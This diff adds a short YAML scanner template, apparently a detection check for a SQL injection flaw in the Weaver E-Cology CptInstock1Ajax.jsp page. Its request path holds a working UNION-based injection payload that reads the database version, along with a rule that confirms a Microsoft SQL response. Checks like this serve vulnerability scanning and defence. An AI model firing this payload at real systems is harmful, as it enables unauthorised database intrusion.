@@ -1,0 +1,11 @@
+name: 泛微E-Cology-CptInstock1Ajax-SQL注入
+description: >
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+@@VERSION,1#
+    expression:
+      status: 200
+      body_all: ["Microsoft SQL"]
